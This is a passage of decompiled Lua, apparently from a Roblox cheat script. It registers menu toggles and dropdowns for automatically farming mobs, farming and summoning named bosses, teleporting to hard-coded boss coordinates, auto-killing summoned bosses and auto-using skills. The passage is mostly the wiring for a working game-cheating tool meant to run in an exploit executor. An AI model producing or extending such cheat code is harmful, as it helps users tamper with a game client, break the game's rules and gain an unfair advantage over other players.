        values.defaultState.value = "Behind"
        values.textValueState3.value = "Above"
        runtime.move(
            { values.defaultState.value, values.textValueState3.value },
            1,
            2,
            1,
            values.valuesState.value
        )
        values.itemsState2.value.Values = values.valuesState.value
        values.itemsState2.value.Multi = false
        values.itemsState2.value.Default = 1
        values.value3 = (
            values.addDropdown(
                values.autoFarmState.value,
                values.textValueState2.value,
                values.itemsState2.value
            )
        )
        values.autoFarmState.value = values.value3
        values.onChanged4 = values.value3.OnChanged
        values.textValueState2.value = functions.selectedAllMobsAtLine1(environment)
        values.onChanged4(values.autoFarmState.value, values.textValueState2.value)
        values.autoFarm4 = values.items31.AutoFarm
        values.autoFarmState.value = values.autoFarm4
        values.addSection = values.autoFarm4.AddSection
        values.textValueState2.value = "All Mob Farm"
        values.addSection(values.autoFarmState.value, values.textValueState2.value)
        values.values2 = runtime.create(17)
        values.autoFarmState.value = "Thief (Lv. 10)"
        values.textValueState2.value = "Thief Boss (Lv. 25)"
        values.itemsState2.value = "Monkey (Lv. 250)"
        values.valuesState.value = "Monkey Boss (Lv. 500)"
        values.defaultState.value = "Desert Bandit (Lv. 750)"
        values.textValueState3.value = "Desert Boss (Lv. 1000)"
        values.textValueState4.value = "Frost Rogue (Lv. 1500)"
        values.bossState.value = "Academy Teacher (Lv. 9000)"
        values.bossState2.value = "Swordsman (Lv. 10000)"
        values.textValueState5.value = "Quincy (Lv. 10750)"
        runtime.move(
            {
                values.autoFarmState.value,
                values.textValueState2.value,
                values.itemsState2.value,
                values.valuesState.value,
                values.defaultState.value,
                values.textValueState3.value,
                values.textValueState4.value,
                "Snow Boss (Lv. 2000)",
                "Sorcerer Student (Lv. 3000)",
                "Panda Boss (Lv. 4000)",
                "Hollow (Lv. 5000)",
                "Strong Sorcerer (Lv. 6000)",
                "Curse (Lv. 7000)",
                "Slime (Lv. 8000)",
                values.bossState.value,
                values.bossState2.value,
                values.textValueState5.value,
            },
            1,
            17,
            1,
            values.values2
        )
        values.autoFarmState.value = environment._G
        values.textValueState2.value = {}
        values.autoFarmState.value.SelectedAllMobs = values.textValueState2.value
        values.autoFarmState.value = values.items31.AutoFarm
        values.gValue = values.autoFarmState.value
        values.textValueState2.value = values.gValue
        values.autoFarmState.value = values.gValue.AddDropdown
        values.itemsState2.value = "SelectAllMobTargets"
        values.valuesState.value = {}
        values.valuesState.value.Title = "Select Mobs to Farm"
        values.valuesState.value.Values = values.values2
        values.valuesState.value.Multi = true
        values.defaultState.value = {}
        values.valuesState.value.Default = values.defaultState.value
        values.autoFarmState.value = values.autoFarmState.value(
            values.textValueState2.value,
            values.itemsState2.value,
            values.valuesState.value
        )
        values.gValue2 = values.autoFarmState.value
        values.textValueState2.value = values.gValue2
        values.autoFarmState.value = values.gValue2.OnChanged
        values.itemsState2.value = functions.handleCallback6(environment)
        values.autoFarmState.value(values.textValueState2.value, values.itemsState2.value)
        values.autoFarmState.value = 1
        values.textValueState2.value = {}
        values.itemsState2.value = false
        values.valuesState.value = nil
        values.defaultState.value = environment.tick
        values.defaultState.value = values.defaultState.value()
        values.textValueState3.value = nil
        values.textValueState4.value = 0
        environment.task.spawn(
            functions.handleWaitAtLine110(
                environment,
                values.options,
                values.textValueState2,
                values.valuesState,
                values.textValueState3,
                values.textValueState4,
                values.itemsState2,
                values.autoFarmState,
                values.values2,
                values.localPlayer2,
                values.items41,
                values.callback6,
                values.defaultState,
                values.callback5,
                values.callback8,
                values.callback13,
                values.sharedValueState4,
                values.callback15
            )
        )
        values.autoFarm5 = values.items31.AutoFarm
        values.addToggle3 = values.autoFarm5.AddToggle
        values.items2 = {}
        values.items2.Title = "Auto Farm All Mobs"
        values.items2.Default = false
        values.value4 = (values.addToggle3(values.autoFarm5, "AutoFarmAllMob", values.items2))
        values.value4.OnChanged(
            values.value4,
            functions.handleSpawn3(
                environment,
                values.itemsState2,
                values.values2,
                values.autoFarmState,
                values.items41,
                values.callback6
            )
        )
        values.autoFarm6 = values.items31.AutoFarm
        values.autoFarm6.AddSection(values.autoFarm6, "Boss Farm")
        values.values3 = runtime.create(7)
        values.bossState.value = "YamatoBoss"
        runtime.move(
            {
                "AlucardBoss",
                "JinwooBoss",
                "SukunaBoss",
                "YujiBoss",
                "AizenBoss",
                "GojoBoss",
                values.bossState.value,
            },
            1,
            7,
            1,
            values.values3
        )
        values.items3 = {}
        values.yujiBoss = environment.CFrame.new(1537.92871, 12.9861355, 226.108246)
        values.items3.YujiBoss = values.yujiBoss
        values.sukunaBoss = environment.CFrame.new(1571.26672, 80.2205353, -34.1126976)
        values.items3.SukunaBoss = values.sukunaBoss
        values.jinwooBoss = environment.CFrame.new(248.741516, 15.0932388, 927.542053)
        values.items3.JinwooBoss = values.jinwooBoss
        values.alucardBoss = environment.CFrame.new(248.741516, 15.0932388, 927.542053)
        values.items3.AlucardBoss = values.alucardBoss
        values.gojoBoss = environment.CFrame.new(1858.32666, 15.9861355, 338.140015)
        values.items3.GojoBoss = values.gojoBoss
        values.aizenBoss = environment.CFrame.new(-567.223083, 2.57872534, 1228.49036)
        values.items3.AizenBoss = values.aizenBoss
        values.new = environment.CFrame.new
        values.bossState.value = 0
        values.bossState2.value = 0
        values.textValueState5.value = 0
        values.itemsState3.value = 1
        values.valuesState2.value = 0
        values.textValueState6.value = 0
        values.yamatoBoss = values.new(
            -1422.68103,
            27.420002,
            -1383.4696,
            1,
            values.bossState.value,
            values.bossState2.value,
            values.textValueState5.value,
            values.itemsState3.value,
            values.valuesState2.value,
            values.textValueState6.value,
            0,
            1
        )
        values.items3.YamatoBoss = values.yamatoBoss
        values.gValue3 = environment._G
        values.globalChatAlert = environment._G.GlobalChatAlert
        if not values.globalChatAlert then
            values.globalChatAlert = {}
        end
        values.gValue3.GlobalChatAlert = values.globalChatAlert
        values.gValue9 = environment._G
        values.globalBossStates = environment._G.GlobalBossStates
        if not values.globalBossStates then
            values.globalBossStates = {}
        end
        values.gValue9.GlobalBossStates = values.globalBossStates
        values.items22 = {}
        values.items22.Aizen = "AizenBoss"
        values.items22.Yamato = "YamatoBoss"
        values.items22.Gojo = "GojoBoss"
        values.items22.Sukuna = "SukunaBoss"
        values.items22.Jinwoo = "JinwooBoss"
        values.items22.Alucard = "AlucardBoss"
        values.items22.Yuji = "YujiBoss"
        environment.task.spawn(
            functions.handlePcallAtLine87(
                environment,
                functions.handleFindAtLine1(environment, values.items22)
            )
        )
        values.callback4 = functions.handleFindFirstChild6(environment)
        values.bossState.value = environment._G
        values.bossState.value.CurrentLockedBoss = values.currentLockedBoss
        values.bossState.value = environment._G
        values.bossState.value.BossIsActive = false
        values.bossState.value = environment._G
        values.bossState.value.BossWaitTimer = 0
        values.bossState.value = values.items31.AutoFarm
        values.boss = values.bossState.value
        values.bossState2.value = values.boss
        values.bossState.value = values.boss.AddDropdown
        values.textValueState5.value = "SelectBoss"
        values.itemsState3.value = {}
        values.itemsState3.value.Title = "Select Boss"
        values.itemsState3.value.Values = values.values3
        values.itemsState3.value.Multi = true
        values.valuesState2.value = {}
        values.itemsState3.value.Default = values.valuesState2.value
        values.bossState.value = values.bossState.value(
            values.bossState2.value,
            values.textValueState5.value,
            values.itemsState3.value
        )
        values.boss2 = values.bossState.value
        values.bossState2.value = values.boss2
        values.bossState.value = values.boss2.OnChanged
        values.textValueState5.value = functions.handleCallback9(environment)
        values.bossState.value(values.bossState2.value, values.textValueState5.value)
        values.bossState.value = values.items31.AutoFarm
        values.boss3 = values.bossState.value
        values.bossState2.value = values.boss3
        values.bossState.value = values.boss3.AddToggle
        values.textValueState5.value = "AutoBossFarm"
        values.itemsState3.value = {}
        values.itemsState3.value.Title = "Auto Farm Boss"
        values.itemsState3.value.Default = false
        values.bossState.value = values.bossState.value(
            values.bossState2.value,
            values.textValueState5.value,
            values.itemsState3.value
        )
        values.boss4 = values.bossState.value
        values.bossState2.value = values.boss4
        values.bossState.value = values.boss4.OnChanged
        values.textValueState5.value = functions.handleCallback33(environment)
        values.bossState.value(values.bossState2.value, values.textValueState5.value)
        values.bossState.value = environment.task
        values.bossState.value = values.bossState.value.spawn
        values.bossState2.value = functions.handlePcallAtLine57(
            environment,
            values.options,
            functions.handleLower(environment, functions.handlePcall5(environment), values.callback4),
            values.callback4,
            values.items3,
            values.localPlayer2,
            values.callback8,
            values.callback13,
            values.callback15,
            values.callback14
        )
        values.bossState.value(values.bossState2.value)
        values.bossState.value = values.items31.AutoFarm
        values.boss5 = values.bossState.value
        values.bossState2.value = values.boss5
        values.bossState.value = values.boss5.AddSection
        values.textValueState5.value = "Farm Boss Summon"
        values.bossState.value(values.bossState2.value, values.textValueState5.value)
        values.bossState.value = values.items31.AutoFarm
        values.boss6 = values.bossState.value
        values.bossState2.value = values.boss6
        values.bossState.value = values.boss6.AddDropdown
        values.textValueState5.value = "SelectSummonBoss"
        values.itemsState3.value = {}
        values.itemsState3.value.Title = "Select Summon Boss"
        values.itemsState3.value.Values = values.values14
        values.itemsState3.value.Multi = false
        values.itemsState3.value.Default = 1
        values.bossState.value = values.bossState.value(
            values.bossState2.value,
            values.textValueState5.value,
            values.itemsState3.value
        )
        values.boss7 = values.bossState.value
        values.bossState2.value = values.boss7
        values.bossState.value = values.boss7.OnChanged
        values.textValueState5.value = functions.handleCallbackAtLine1(environment)
        values.bossState.value(values.bossState2.value, values.textValueState5.value)
        values.bossState.value = values.items31.AutoFarm
        values.boss8 = values.bossState.value
        values.bossState2.value = values.boss8
        values.bossState.value = values.boss8.AddToggle
        values.textValueState5.value = "AutoSummon"
        values.itemsState3.value = {}
        values.itemsState3.value.Title = "Auto Summon Boss"
        values.itemsState3.value.Default = false
        values.bossState.value = values.bossState.value(
            values.bossState2.value,
            values.textValueState5.value,
            values.itemsState3.value
        )
        values.boss9 = values.bossState.value
        values.bossState2.value = values.boss9
        values.bossState.value = values.boss9.OnChanged
        values.textValueState5.value = functions.handleSpawnAtLine1(environment)
        values.bossState.value(values.bossState2.value, values.textValueState5.value)
        values.bossState.value = values.items31.AutoFarm
        values.boss10 = values.bossState.value
        values.bossState2.value = values.boss10
        values.bossState.value = values.boss10.AddToggle
        values.textValueState5.value = "AutoKillSummon"
        values.itemsState3.value = {}
        values.itemsState3.value.Title = "Auto Kill Summon"
        values.itemsState3.value.Default = false
        values.bossState.value = values.bossState.value(
            values.bossState2.value,
            values.textValueState5.value,
            values.itemsState3.value
        )
        values.boss11 = values.bossState.value
        values.bossState2.value = values.boss11
        values.bossState.value = values.boss11.OnChanged
        values.textValueState5.value = functions.handleSpawn2(
            environment,
            values.callback9,
            values.localPlayer2,
            values.callback8,
            values.callback13,
            values.callback15,
            values.callback14
        )
        values.bossState.value(values.bossState2.value, values.textValueState5.value)
        values.bossState.value = values.items31.AutoFarm
        values.boss12 = values.bossState.value
        values.bossState2.value = values.boss12
        values.bossState.value = values.boss12.AddSection
        values.textValueState5.value = "Skill Manage"
        values.bossState.value(values.bossState2.value, values.textValueState5.value)
        values.bossState.value = values.items31.AutoFarm
        values.boss13 = values.bossState.value
        values.bossState2.value = values.boss13
        values.bossState.value = values.boss13.AddDropdown
        values.textValueState5.value = "SelectSkills"
        values.itemsState3.value = {}
        values.itemsState3.value.Title = "Select Skills"
        values.valuesState2.value = runtime.create(5)
        values.textValueState6.value = "Z"
        runtime.move({ values.textValueState6.value, "X", "C", "V", "F" }, 1, 5, 1, values.valuesState2.value)
        values.itemsState3.value.Values = values.valuesState2.value
        values.itemsState3.value.Multi = true
        values.valuesState2.value = {}
        values.itemsState3.value.Default = values.valuesState2.value
        values.bossState.value = values.bossState.value(
            values.bossState2.value,
            values.textValueState5.value,
            values.itemsState3.value
        )
        values.boss14 = values.bossState.value
        values.bossState2.value = values.boss14
        values.bossState.value = values.boss14.OnChanged
        values.textValueState5.value = functions.handleCallback27(environment)
        values.bossState.value(values.bossState2.value, values.textValueState5.value)
        values.bossState.value = values.items31.AutoFarm
        values.boss15 = values.bossState.value
        values.bossState2.value = values.boss15
        values.bossState.value = values.boss15.AddToggle
        values.textValueState5.value = "AutoSkill"
        values.itemsState3.value = {}
        values.itemsState3.value.Title = "Auto Use Skills"
        values.itemsState3.value.Default = false
        values.bossState.value = values.bossState.value(
            values.bossState2.value,
            values.textValueState5.value,
            values.itemsState3.value
        )
        values.boss16 = values.bossState.value
        values.bossState2.value = values.boss16
        values.bossState.value = values.boss16.OnChanged
        values.textValueState5.value = functions.handleCallback18(environment)
        values.bossState.value(values.bossState2.value, values.textValueState5.value)
        values.bossState.value = values.items31.Boss
        values.boss17 = values.bossState.value
        values.bossState2.value = values.boss17
        values.bossState.value = values.boss17.AddSection
        values.textValueState5.value = "Auto Summon Anos Boss"
        values.bossState.value(values.bossState2.value, values.textValueState5.value)
        values.bossState.value = environment._G
        values.bossState.value.SelectedSummonAnosBoss = "Anos"
        values.bossState.value = environment._G
        values.bossState.value.SelectedDifficultyAnos = "Normal"
        values.bossState.value = values.items31.Boss
        values.boss18 = values.bossState.value
        values.bossState2.value = values.boss18
        values.bossState.value = values.boss18.AddDropdown
        values.textValueState5.value = "SelectSummonAnosBoss"
        values.itemsState3.value = {}
        values.itemsState3.value.Title = "Select Boss"
        values.valuesState2.value = runtime.create(1)
        values.textValueState6.value = "Anos"
        runtime.move({ values.textValueState6.value }, 1, 1, 1, values.valuesState2.value)
        values.itemsState3.value.Values = values.valuesState2.value
        values.itemsState3.value.Multi = false
        values.itemsState3.value.Default = 1
        values.bossState.value = values.bossState.value(
            values.bossState2.value,
            values.textValueState5.value,
            values.itemsState3.value
        )
        values.boss19 = values.bossState.value
        values.bossState2.value = values.boss19
        values.bossState.value = values.boss19.OnChanged
        values.textValueState5.value = functions.handleCallback23(environment)
        values.bossState.value(values.bossState2.value, values.textValueState5.value)
        values.bossState.value = values.items31.Boss
        values.boss20 = values.bossState.value
        values.bossState2.value = values.boss20
        values.bossState.value = values.boss20.AddDropdown
        values.textValueState5.value = "SelectDifficultyAnos"
        values.itemsState3.value = {}
        values.itemsState3.value.Title = "Select Difficulty"
        values.valuesState2.value = runtime.create(4)
        values.textValueState6.value = "Normal"
        runtime.move(
            { values.textValueState6.value, "Medium", "Hard", "Extreme" },
            1,
            4,
            1,
            values.valuesState2.value
        )
        values.itemsState3.value.Values = values.valuesState2.value
        values.itemsState3.value.Multi = false
        values.itemsState3.value.Default = 1
        values.bossState.value = values.bossState.value(
            values.bossState2.value,
            values.textValueState5.value,
            values.itemsState3.value
        )
        values.boss21 = values.bossState.value
        values.bossState2.value = values.boss21
        values.bossState.value = values.boss21.OnChanged
        values.textValueState5.value = functions.handleCallback16(environment)
        values.bossState.value(values.bossState2.value, values.textValueState5.value)
        values.bossState.value = values.items31.Boss
        values.boss22 = values.bossState.value
        values.bossState2.value = values.boss22
        values.bossState.value = values.boss22.AddToggle
        values.textValueState5.value = "AutoSummonBossAnos"
        values.itemsState3.value = {}
        values.itemsState3.value.Title = "Auto Summon Anos"
        values.itemsState3.value.Default = false
        values.bossState.value(
            values.bossState2.value,
            values.textValueState5.value,
            values.itemsState3.value
        )
        values.bossState.value = values.items31.Boss
        values.boss23 = values.bossState.value
        values.bossState2.value = values.boss23
        values.bossState.value = values.boss23.AddToggle
        values.textValueState5.value = "AutoKillBossAnos"
        values.itemsState3.value = {}
        values.itemsState3.value.Title = "Auto Kill Anos Boss"
        values.itemsState3.value.Default = false
        values.bossState.value = values.bossState.value(
            values.bossState2.value,
            values.textValueState5.value,
            values.itemsState3.value
        )
        values.boss24 = values.bossState.value
        values.bossState2.value = values.boss24
        values.bossState.value = values.boss24.OnChanged
        values.textValueState5.value = functions.handleNewAtLine1(environment, values.callback9)
        values.bossState.value(values.bossState2.value, values.textValueState5.value)
        values.bossState.value = environment.task
        values.bossState.value = values.bossState.value.spawn
        values.bossState2.value = functions.handlePcallAtLine19(environment, values.options)
        values.bossState.value(values.bossState2.value)
        values.bossState.value = environment.task
        values.bossState.value = values.bossState.value.spawn
        values.bossState2.value = functions.handlePcallAtLine117(
            environment,
            values.options,
            capturedClonerefResult,
            values.callback13,
            values.callback8,
            values.callback15,
            values.callback14
        )
        values.bossState.value(values.bossState2.value)
        values.bossState.value = values.items31.Boss
        values.boss25 = values.bossState.value
        values.bossState2.value = values.boss25
        values.bossState.value = values.boss25.AddSection
        values.textValueState5.value = "Auto Summon Boss V2"
        values.bossState.value(values.bossState2.value, values.textValueState5.value)
        values.bossState.value = environment._G
        values.bossState.value.SelectedSummonV2Boss = "GojoV2"
        values.bossState.value = environment._G
        values.bossState.value.SelectedDifficultyV2 = "Normal"
        values.bossState.value = values.items31.Boss
        values.boss26 = values.bossState.value
        values.bossState2.value = values.boss26
        values.bossState.value = values.boss26.AddDropdown
        values.textValueState5.value = "SelectSummonBossV2"
        values.itemsState3.value = {}
        values.itemsState3.value.Title = "Select Boss"
        values.valuesState2.value = runtime.create(2)
        values.textValueState6.value = "GojoV2"
        runtime.move({ values.textValueState6.value, "SukunaV2" }, 1, 2, 1, values.valuesState2.value)
        values.itemsState3.value.Values = values.valuesState2.value
        values.itemsState3.value.Multi = false
        values.itemsState3.value.Default = 1
        values.bossState.value = values.bossState.value(
            values.bossState2.value,
            values.textValueState5.value,
            values.itemsState3.value
        )
        values.boss27 = values.bossState.value
        values.bossState2.value = values.boss27
        values.bossState.value = values.boss27.OnChanged
        values.textValueState5.value = functions.handleCallback13(environment)
        values.bossState.value(values.bossState2.value, values.textValueState5.value)
        values.bossState.value = values.items31.Boss
        values.boss28 = values.bossState.value
        values.bossState2.value = values.boss28
        values.bossState.value = values.boss28.AddDropdown
        values.textValueState5.value = "SelectDifficultyV2"
        values.itemsState3.value = {}
        values.itemsState3.value.Title = "Select Difficulty"
        values.valuesState2.value = runtime.create(4)
        values.textValueState6.value = "Normal"
        runtime.move(
            { values.textValueState6.value, "Medium", "Hard", "Extreme" },
            1,
            4,
            1,
            values.valuesState2.value
        )
        values.itemsState3.value.Values = values.valuesState2.value
        values.itemsState3.value.Multi = false
        values.itemsState3.value.Default = 1
        values.bossState.value = values.bossState.value(
            values.bossState2.value,
            values.textValueState5.value,
            values.itemsState3.value
        )
        values.boss29 = values.bossState.value
        values.bossState2.value = values.boss29
        values.bossState.value = values.boss29.OnChanged
        values.textValueState5.value = functions.handleCallback10(environment)
        values.bossState.value(values.bossState2.value, values.textValueState5.value)
        values.bossState.value = values.items31.Boss
        values.boss30 = values.bossState.value
        values.bossState2.value = values.boss30
        values.bossState.value = values.boss30.AddToggle
        values.textValueState5.value = "AutoSummonBossV2"
        values.itemsState3.value = {}
        values.itemsState3.value.Title = "Auto Summon V2"
        values.itemsState3.value.Default = false
        values.bossState.value(
            values.bossState2.value,
            values.textValueState5.value,
            values.itemsState3.value
        )
        values.bossState.value = values.items31.Boss
        values.boss31 = values.bossState.value
        values.bossState2.value = values.boss31
        values.bossState.value = values.boss31.AddToggle
        values.textValueState5.value = "AutoKillBossV2"
        values.itemsState3.value = {}
        values.itemsState3.value.Title = "Auto Kill Boss V2"
        values.itemsState3.value.Default = false
        values.bossState.value = values.bossState.value(
            values.bossState2.value,
            values.textValueState5.value,
            values.itemsState3.value
        )
        values.boss32 = values.bossState.value
        values.bossState2.value = values.boss32
        values.bossState.value = values.boss32.OnChanged
        values.textValueState5.value = functions.handleNew3(environment, values.callback9)
        values.bossState.value(values.bossState2.value, values.textValueState5.value)
        values.bossState.value = environment.task
        values.bossState.value = values.bossState.value.spawn
        values.bossState2.value = functions.handlePcallAtLine2161(environment, values.options)
        values.bossState.value(values.bossState2.value)
        values.bossState.value = environment.task
        values.bossState.value = values.bossState.value.spawn
        values.bossState2.value = functions.handleWaitAtLine42(
            environment,
            values.options,
            capturedClonerefResult,
            values.callback13,
            values.callback8,
            values.callback15,
            values.callback14
        )
        values.bossState.value(values.bossState2.value)
        values.bossState.value = values.items31.Boss
        values.boss33 = values.bossState.value
        values.bossState2.value = values.boss33
        values.bossState.value = values.boss33.AddSection
        values.textValueState5.value = "Auto Summon Rimuru"
        values.bossState.value(values.bossState2.value, values.textValueState5.value)
        values.bossState.value = environment._G
        values.bossState.value.SelectedRimuruDifficulty = "Normal"
        values.bossState.value = values.items31.Boss
        values.boss34 = values.bossState.value
        values.bossState2.value = values.boss34
        values.bossState.value = values.boss34.AddDropdown
        values.textValueState5.value = "SelectRimuruDifficulty"
        values.itemsState3.value = {}
        values.itemsState3.value.Title = "Select Difficulty"
        values.valuesState2.value = runtime.create(4)
        values.textValueState6.value = "Normal"
        runtime.move(
            { values.textValueState6.value, "Medium", "Hard", "Extreme" },
            1,
            4,
            1,
            values.valuesState2.value
        )
        values.itemsState3.value.Values = values.valuesState2.value
        values.itemsState3.value.Multi = false
        values.itemsState3.value.Default = 1
        values.bossState.value = values.bossState.value(
            values.bossState2.value,
            values.textValueState5.value,
            values.itemsState3.value
        )
        values.boss35 = values.bossState.value
        values.bossState2.value = values.boss35
        values.bossState.value = values.boss35.OnChanged
        values.textValueState5.value = functions.handleCallback20(environment)
        values.bossState.value(values.bossState2.value, values.textValueState5.value)
        values.bossState.value = values.items31.Boss
        values.boss36 = values.bossState.value
        values.bossState2.value = values.boss36
        values.bossState.value = values.boss36.AddToggle
        values.textValueState5.value = "AutoSummonRimuru"
        values.itemsState3.value = {}
        values.itemsState3.value.Title = "Auto Summon Rimuru"
        values.itemsState3.value.Default = false
        values.bossState.value(
            values.bossState2.value,
            values.textValueState5.value,
            values.itemsState3.value
        )
        values.bossState.value = values.items31.Boss
        values.boss37 = values.bossState.value
        values.bossState2.value = values.boss37
        values.bossState.value = values.boss37.AddToggle
        values.textValueState5.value = "AutoKillRimuru"
        values.itemsState3.value = {}
        values.itemsState3.value.Title = "Auto Kill Rimuru"
        values.itemsState3.value.Default = false
        values.bossState.value = values.bossState.value(
            values.bossState2.value,
            values.textValueState5.value,
            values.itemsState3.value
        )
        values.boss38 = values.bossState.value
        values.bossState2.value = values.boss38
        values.bossState.value = values.boss38.OnChanged
        values.textValueState5.value = functions.handleNew7(environment, values.callback9)
        values.bossState.value(values.bossState2.value, values.textValueState5.value)
        values.bossState.value = environment.task
        values.bossState.value = values.bossState.value.spawn
        values.bossState2.value = functions.handleWaitAtLine105(environment, values.options)
        values.bossState.value(values.bossState2.value)
        values.bossState.value = environment.task
        values.bossState.value = values.bossState.value.spawn
        values.bossState2.value = functions.handleWaitAtLine115(
            environment,
            values.options,
            capturedClonerefResult,
            values.callback13,
            values.callback8,
            values.callback15,
            values.callback14
        )
        values.bossState.value(values.bossState2.value)
        values.bossState.value = values.items31.Boss
        values.boss39 = values.bossState.value
        values.bossState2.value = values.boss39
        values.bossState.value = values.boss39.AddSection
        values.textValueState5.value = "Auto Summon True Aizen"
        values.bossState.value(values.bossState2.value, values.textValueState5.value)
        values.bossState.value = environment._G
        values.bossState.value.SelectedTrueAizenDifficulty = "Normal"
        values.bossState.value = values.items31.Boss
        values.boss40 = values.bossState.value
        values.bossState2.value = values.boss40
        values.bossState.value = values.boss40.AddDropdown
        values.textValueState5.value = "SelectTrueAizenDifficulty"
        values.itemsState3.value = {}
        values.itemsState3.value.Title = "Select Difficulty"
        values.valuesState2.value = runtime.create(4)
        values.textValueState6.value = "Normal"
        runtime.move(
            { values.textValueState6.value, "Medium", "Hard", "Extreme" },
            1,
            4,
            1,
            values.valuesState2.value
        )
        values.itemsState3.value.Values = values.valuesState2.value
        values.itemsState3.value.Multi = false
        values.itemsState3.value.Default = 1
        values.bossState.value = values.bossState.value(
            values.bossState2.value,
            values.textValueState5.value,
            values.itemsState3.value
        )
        values.boss41 = values.bossState.value
        values.bossState2.value = values.boss41
        values.bossState.value = values.boss41.OnChanged
        values.textValueState5.value = functions.handleCallback14(environment)
        values.bossState.value(values.bossState2.value, values.textValueState5.value)
        values.bossState.value = values.items31.Boss
        values.boss42 = values.bossState.value
        values.bossState2.value = values.boss42
        values.bossState.value = values.boss42.AddToggle
        values.textValueState5.value = "AutoSummonTrueAizen"
        values.itemsState3.value = {}
        values.itemsState3.value.Title = "Auto Summon True Aizen"
        values.itemsState3.value.Default = false
        values.bossState.value(
            values.bossState2.value,
            values.textValueState5.value,
            values.itemsState3.value
        )
        values.bossState.value = values.items31.Boss
        values.boss43 = values.bossState.value
        values.bossState2.value = values.boss43
        values.bossState.value = values.boss43.AddToggle
        values.textValueState5.value = "AutoKillTrueAizen"
        values.itemsState3.value = {}
        values.itemsState3.value.Title = "Auto Kill True Aizen"
        values.itemsState3.value.Default = false
        values.bossState.value = values.bossState.value(
            values.bossState2.value,
            values.textValueState5.value,
            values.itemsState3.value
        )
        values.boss44 = values.bossState.value
        values.bossState2.value = values.boss44
        values.bossState.value = values.boss44.OnChanged
        values.textValueState5.value = functions.handleNew4(environment, values.callback9)
        values.bossState.value(values.bossState2.value, values.textValueState5.value)
        values.bossState.value = environment.task
        values.bossState.value = values.bossState.value.spawn
        values.bossState2.value = functions.handlePcallAtLine21(environment, values.options)
        values.bossState.value(values.bossState2.value)
        values.bossState.value = environment.task
        values.bossState.value = values.bossState.value.spawn
        values.bossState2.value = functions.handleWaitAtLine12(
            environment,
            values.options,
            capturedClonerefResult,
            values.callback13,
            values.callback8,
            values.callback15,
            values.callback14
        )
        values.bossState.value(values.bossState2.value)
        values.bossState.value = values.items31.Boss
        values.boss45 = values.bossState.value
        values.bossState2.value = values.boss45
        values.bossState.value = values.boss45.AddSection
        values.textValueState5.value = "Auto Summon Gilgamesh"
        values.bossState.value(values.bossState2.value, values.textValueState5.value)
        values.bossState.value = environment._G
        values.bossState.value.SelectedGilgameshDifficulty = "Normal"
        values.bossState.value = values.items31.Boss
        values.boss46 = values.bossState.value
        values.bossState2.value = values.boss46
        values.bossState.value = values.boss46.AddDropdown
        values.textValueState5.value = "SelectGilgameshDifficulty"
        values.itemsState3.value = {}
        values.itemsState3.value.Title = "Select Difficulty"
        values.valuesState2.value = runtime.create(4)
        values.textValueState6.value = "Normal"
        runtime.move(
            { values.textValueState6.value, "Medium", "Hard", "Extreme" },
            1,
            4,
            1,
            values.valuesState2.value
        )
        values.itemsState3.value.Values = values.valuesState2.value
        values.itemsState3.value.Multi = false
        values.itemsState3.value.Default = 1
        values.bossState.value = values.bossState.value(
            values.bossState2.value,
            values.textValueState5.value,
            values.itemsState3.value
        )
        values.boss47 = values.bossState.value
        values.bossState2.value = values.boss47
        values.bossState.value = values.boss47.OnChanged
        values.textValueState5.value = functions.handleCallback2(environment)
        values.bossState.value(values.bossState2.value, values.textValueState5.value)
        values.bossState.value = values.items31.Boss
        values.boss48 = values.bossState.value
        values.bossState2.value = values.boss48
        values.bossState.value = values.boss48.AddToggle
        values.textValueState5.value = "AutoSummonGilgamesh"
        values.itemsState3.value = {}
        values.itemsState3.value.Title = "Auto Summon Gilgamesh"
        values.itemsState3.value.Default = false
        values.bossState.value(
            values.bossState2.value,
            values.textValueState5.value,
            values.itemsState3.value
        )
        values.bossState.value = values.items31.Boss
        values.boss49 = values.bossState.value
        values.bossState2.value = values.boss49
        values.bossState.value = values.boss49.AddToggle
        values.textValueState5.value = "AutoKillGilgamesh"
        values.itemsState3.value = {}
        values.itemsState3.value.Title = "Auto Kill Gilgamesh"
        values.itemsState3.value.Default = false
        values.bossState.value = values.bossState.value(
            values.bossState2.value,
            values.textValueState5.value,
            values.itemsState3.value
        )
        values.boss50 = values.bossState.value
        values.bossState2.value = values.boss50
        values.bossState.value = values.boss50.OnChanged
        values.textValueState5.value = functions.handleSpawn(environment, values.callback9)
        values.bossState.value(values.bossState2.value, values.textValueState5.value)
        values.bossState.value = environment.task
        values.bossState.value = values.bossState.value.spawn
        values.bossState2.value = functions.handleWaitAtLine29(environment, values.options)
        values.bossState.value(values.bossState2.value)
        values.bossState.value = environment.task
        values.bossState.value = values.bossState.value.spawn
        values.bossState2.value = functions.handleWaitAtLine57(
            environment,
            values.options,
            values.callback8,
            values.callback13,
            values.callback15,
            values.callback14
        )
        values.bossState.value(values.bossState2.value)
        values.bossState.value = values.items31.Boss
        values.boss51 = values.bossState.value
        values.bossState2.value = values.boss51
        values.bossState.value = values.boss51.AddSection
        values.textValueState5.value = "Maiden Summon"
        values.bossState.value(values.bossState2.value, values.textValueState5.value)
        values.bossState.value = environment._G
        values.bossState.value.SelectedMaidenDifficulty = "Normal"
        values.bossState.value = values.items31.Boss
        values.boss52 = values.bossState.value
        values.bossState2.value = values.boss52
        values.bossState.value = values.boss52.AddDropdown
        values.textValueState5.value = "SelectMaidenDifficulty"
        values.itemsState3.value = {}
        values.itemsState3.value.Title = "Select Difficulty"
        values.valuesState2.value = runtime.create(4)
        values.textValueState6.value = "Normal"
        runtime.move(
            { values.textValueState6.value, "Medium", "Hard", "Extreme" },
            1,
            4,
            1,
            values.valuesState2.value
        )
        values.itemsState3.value.Values = values.valuesState2.value
        values.itemsState3.value.Multi = false
        values.itemsState3.value.Default = 1
        values.bossState.value = values.bossState.value(
            values.bossState2.value,
            values.textValueState5.value,
            values.itemsState3.value
        )
        values.boss53 = values.bossState.value
        values.bossState2.value = values.boss53
        values.bossState.value = values.boss53.OnChanged
        values.textValueState5.value = functions.handleCallback24(environment)
        values.bossState.value(values.bossState2.value, values.textValueState5.value)
        values.bossState.value = values.items31.Boss
        values.boss54 = values.bossState.value
        values.bossState2.value = values.boss54
        values.bossState.value = values.boss54.AddToggle
        values.textValueState5.value = "AutoSummonMaiden"
        values.itemsState3.value = {}
        values.itemsState3.value.Title = "Auto Summon Maiden"
        values.itemsState3.value.Default = false
        values.bossState.value(
            values.bossState2.value,
            values.textValueState5.value,
            values.itemsState3.value
        )
        values.bossState.value = values.items31.Boss
        values.boss55 = values.bossState.value
        values.bossState2.value = values.boss55
        values.bossState.value = values.boss55.AddToggle
        values.textValueState5.value = "AutoKillMaiden"
